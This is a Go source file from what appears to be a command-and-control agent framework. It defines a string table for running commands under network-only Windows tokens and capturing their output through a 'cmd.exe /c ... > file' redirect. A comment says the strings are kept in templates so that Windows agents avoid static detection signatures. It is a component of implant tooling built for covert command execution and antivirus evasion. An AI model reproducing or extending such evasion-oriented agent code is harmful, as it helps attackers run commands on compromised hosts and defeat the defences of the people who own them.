// internal/templates/netonly.go
package templates

// TypeNetOnlyFileSupport is the command type identifier for netonly file support template
const TypeNetOnlyFileSupport = 28

// GetNetOnlyFileSupportTemplate returns the template for network-only file support strings
// This template is used by Windows agents to avoid static signatures for network path detection
func GetNetOnlyFileSupportTemplate() *CommandTemplate {
	tpl := make([]string, MaxTemplateSize)

	// Windows API proc name (850)
	tpl[IdxNfProcGetDriveType] = "GetDriveTypeW"

	// UNC path prefixes (851-852)
	tpl[IdxNfUncPrefix] = "\\\\"
	tpl[IdxNfUncPrefixAlt] = "//"

	// Drive root suffix (853)
	tpl[IdxNfDriveRootSuffix] = ":\\"

	// Format string for network-only token message (854)
	tpl[IdxNfFmtNetOnlyToken] = "Using network-only token '%s' (%s\\%s) for: %s\n"

	// Network token wrapper format strings (855-863)
	tpl[IdxNfFmtUsingNetToken] = "Using network-only token: %s\n"
	tpl[IdxNfFmtExecNetToken] = "Executing with network-only token: %s\n"
	tpl[IdxNfFmtProcComplete] = "Process %d completed with exit code %d\n"
	tpl[IdxNfFmtUser] = "    User: %s\n\n"
	tpl[IdxNfMsgCmdExecNetToken] = "Command executed with network-only token\n"
	tpl[IdxNfCmdNet] = "net"
	tpl[IdxNfFmtCmdRedirect] = "cmd.exe /c %s > \"%s\" 2>&1"
	tpl[IdxNfFmtTempFile] = "%s\\netonly_output_%d.txt"
	tpl[IdxNfPlaceholderUser] = "DOMAIN\\User"

	return &CommandTemplate{
		Version:   1,
		Type:      TypeNetOnlyFileSupport,
		Templates: tpl,
		Params:    []string{},
	}
}
